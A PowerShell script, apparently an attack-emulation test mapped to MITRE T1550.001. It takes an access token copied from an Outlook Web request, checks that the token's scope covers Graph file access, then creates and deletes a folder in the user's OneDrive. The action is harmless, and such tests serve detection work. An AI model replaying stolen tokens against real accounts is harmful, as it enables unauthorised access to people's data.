<#
.SYNOPSIS
Connect to Graph API using a stolen access token, create a folder in the signed-in user's personal OneDrive and delete this folder again

.DESCRIPTION
TA0005: Defense Evasion
T1550.001: Use Alternate Authentication Material - Application Access Token
1st attack method
#>

Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1


# Copy the access token from the request owa makes to https://outlook.office.com/owa/service.svc?action=GetAccessTokenforResource&UA=0&app=Mail
# where x-owa-urlpostdata is {"__type":"TokenRequest:#Exchange","Resource":"https://graph.microsoft.com"}
# In Linux multi-line read-hosts are very slow:
$prompt = "Access token from owa which is for graph"
if ($isLinux -or $isMacOS) {        
    Write-Host -NoNewLine ($prompt + ": ")
    $accessToken = [Console]::ReadLine()
} else {
    $accessToken = Read-Host -Prompt $prompt
}

$accessTokenMiddle = $accessToken.Split(".")[1]
$accessTokenPlain = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($accessTokenMiddle))
if ($accessTokenPlain -notlike '*graph.microsoft.com*' -or $accessTokenPlain -notlike '*Files.ReadWrite*') {
  Write-Error "This access token does not have the right permissions or is not for the right audience. Please verify it using jwt.io"
  exit 1
}

$url = "https://graph.microsoft.com/v1.0/me/drive/root/children"
$rand = Get-Random -Minimum 1000 -Maximum 9999
$newFolder = @{
  "name" ="TA0005 - T1550.001 - 1 - $rand";
  "folder" = @{};
  "@microsoft.graph.conflictBehavior" = "fail";
}
$newFolder = ConvertTo-Json $newFolder #Pipeline breaks empty array
$response = Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"} -Body $newFolder

$itemId = $response.id

# Delete the folder again
Wait-KeyOrTimeOut -Timeout 90000

$url = "https://graph.microsoft.com/v1.0/me/drive/items/$itemId"
$response = Invoke-RestMethod $url -Method Delete -Headers @{"Authorization"="Bearer $accessToken"}
